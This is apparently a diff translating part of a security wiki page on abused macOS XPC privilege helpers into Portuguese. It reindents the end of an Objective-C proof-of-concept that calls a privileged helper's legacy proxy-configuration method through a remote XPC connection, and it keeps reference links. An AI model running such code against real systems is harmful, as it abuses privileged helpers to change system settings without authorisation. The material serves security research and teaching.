-    [remoteProxy legacyConfigureProxyWithAuthorization:authData enabled:isProxyEnabled host:proxyAddress port:proxyPort reply:^(NSError *error, BOOL success) {
-        NSLog(@"Response: %@", error);
-    }];
+// Use the legacy method to configure the proxy
+[remoteProxy legacyConfigureProxyWithAuthorization:authData enabled:isProxyEnabled host:proxyAddress port:proxyPort reply:^(NSError *error, BOOL success) {
+NSLog(@"Response: %@", error);
+}];
 
-    // Allow some time for the operation to complete
-    [NSThread sleepForTimeInterval:10.0f];
+// Allow some time for the operation to complete
+[NSThread sleepForTimeInterval:10.0f];
 
-    NSLog(@"Finished!");
+NSLog(@"Finished!");
 }
 ```
-
-## Other XPC privilege helpers abused
+## Outros auxiliares de privilégio XPC abusados
 
 - [https://blog.securelayer7.net/applied-endpointsecurity-framework-previlege-escalation/?utm_source=pocket_shared](https://blog.securelayer7.net/applied-endpointsecurity-framework-previlege-escalation/?utm_source=pocket_shared)
 
-## References
+## Referências
 
 - [https://theevilbit.github.io/posts/secure_coding_xpc_part1/](https://theevilbit.github.io/posts/secure_coding_xpc_part1/)
 
